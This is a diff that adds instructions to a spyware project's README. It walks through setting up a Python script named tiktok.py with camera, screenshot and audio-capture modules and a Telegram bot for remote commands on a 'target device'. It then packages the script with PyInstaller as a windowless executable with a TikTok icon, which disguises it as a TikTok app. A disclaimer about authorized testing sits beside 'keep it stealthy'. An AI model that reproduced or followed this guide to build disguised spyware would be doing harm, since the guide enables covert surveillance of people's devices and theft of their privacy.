@@ -226,6 +226,52 @@ Warning: This tool is intended for authorized penetration testing and educationa
 
 
 
+Kindly follow the instructions below to create your own spyware successfully
+
+1. Create a folder in your computer in a prefered directory.
+2. Open visual studio code and navigate to file to open the folder you have created.
+3. Navigate to my github account and access the tiktok.py file and tiktok.ico etc, you can either download them or copy their content.
+4. Open the visual studio and create a file by the name "tiktok.py" and paste the code inside the file.
+5. Move your downloaded tiktok.ico and all the other files  to the same directory as your tiktok.py file
+6. Download the necessary requirements. Navigate to the run nav and select new terminal
+   
+    Subprocess
+    os
+    cv2
+    time
+    pyautogui
+    sounddevice
+    soundfile
+    threading 
+    telegrambot
+   
+    USE THIS COMMAND TO DOWNLOAD THE REQUIREMENTS IN THE TERMINAL ````python -m pip install "requirement`s name"````
+   
+8. After all requirements are installed, open telegram and search for bot father and id bot to create your bot token and chat id respectively. NOTE: Dont share your bot token and chat id with anyone!!
+   now after creating them navigate to the code and paste them to the appropriate sections indicated by comments.
+9. Now run the code to check whether the code is working, you can verify it by leaving the code running and opening your telegram and navigate to the bot through the link administered to you after you created the bot. make sure to start your bot.
+                
+
+use the /start command to activate the bot and spyware on the target device at this point the target machine will be your computer coz its currently the one running the code or targets computer.
+
+All the commands to use will be displayed and now you can execute each one of them from your bot to the target device.
+
+10. Now after verifying that it working you can navigate to the terminal and convert the tiktok.py to an executable using the command below:
+    step 1. ````pip install pyinstaller````
+    step 2. Create the Executable
+            Use the following command to convert your Python script (script.py) into an executable with no console and a custom icon:
+
+            bash
+            pyinstaller --noconsole --onefile --icon=path_to_icon.ico tiktok.py
+    
+    Explanation of the flags:
+
+       --noconsole: Hides the console window when running the executable.
+       --onefile: Packages everything into a single .exe file.
+       --icon=path_to_icon.ico: Specifies the custom icon for the executable.
+
+
+
 
 
 🕶️ Keep it stealthy, keep it ethical.
